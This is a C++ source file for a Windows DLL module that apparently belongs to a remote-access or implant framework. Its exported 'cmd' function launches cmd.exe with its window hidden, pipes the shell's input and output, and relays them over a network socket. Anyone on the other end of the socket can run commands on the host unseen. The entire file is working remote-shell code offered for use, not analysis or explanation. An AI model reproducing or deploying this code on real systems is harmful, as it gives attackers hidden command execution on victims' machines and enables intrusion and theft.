#include "../core/external.h"

typedef struct {
    HANDLE fHand;
    char *buf;
} hand_buf;

void helper(hand_buf *arg)
{
    DWORD num;
    for(;;){
        ReadFile(arg->fHand, arg->buf, DllMeta.net.buf_sz, &num, NULL);
        send(DllMeta.net.sock, arg->buf, num, 0);
    }
}

extern "C" __declspec(dllexport) void cmd(const char *arg)
{
    SECURITY_ATTRIBUTES attr;
    
    attr.nLength = sizeof(SECURITY_ATTRIBUTES);
    attr.lpSecurityDescriptor = NULL;
    attr.bInheritHandle = TRUE;   

    HANDLE rStdOut, rStdErr, rStdIn;

    char out_buf[DllMeta.net.buf_sz];
    char err_buf[DllMeta.net.buf_sz];
    char in_buf[DllMeta.net.buf_sz];
    
    STARTUPINFO info;    
    
    ZeroMemory(&info, sizeof(STARTUPINFO));
    info.cb = sizeof(STARTUPINFO);
    
    CreatePipe(&rStdOut, &info.hStdOutput, &attr, DllMeta.net.buf_sz);
    CreatePipe(&rStdErr, &info.hStdError, &attr, DllMeta.net.buf_sz);
    CreatePipe(&info.hStdInput, &rStdIn, &attr, DllMeta.net.buf_sz);
    
    info.dwFlags = STARTF_USESTDHANDLES | STARTF_FORCEOFFFEEDBACK | STARTF_USESHOWWINDOW;
    info.wShowWindow = SW_HIDE;
    
    
    PROCESS_INFORMATION proc_info;
    
    char name[] = "C:\\Windows\\system32\\cmd.exe";
    
    CreateProcess(NULL,
                  name,
                  NULL,
                  NULL,
                  TRUE,
                  0,
                  NULL,
                  NULL,
                  &info,
                  &proc_info
                  );
                  
    CloseHandle(proc_info.hProcess);
    CloseHandle(proc_info.hThread);

    OVERLAPPED over;
    DWORD num;

    hand_buf out = { rStdOut, out_buf };
    hand_buf err = { rStdErr, err_buf };

    HANDLE helpA = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&helper, &out, 0, NULL);
    HANDLE helpB = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&helper, &err, 0, NULL);
    
    for(;;){
        num = recv(DllMeta.net.sock, in_buf, DllMeta.net.buf_sz, 0);
        WriteFile(rStdIn, in_buf, num, NULL, NULL);
        if(strstr(in_buf, "exit")) break;
    }
    
    TerminateThread(helpA, 0);
    TerminateThread(helpB, 0);
    
    CloseHandle(rStdOut);
    CloseHandle(rStdErr);
    CloseHandle(rStdIn);
    CloseHandle(info.hStdOutput);
    CloseHandle(info.hStdInput);
    CloseHandle(info.hStdError);
}
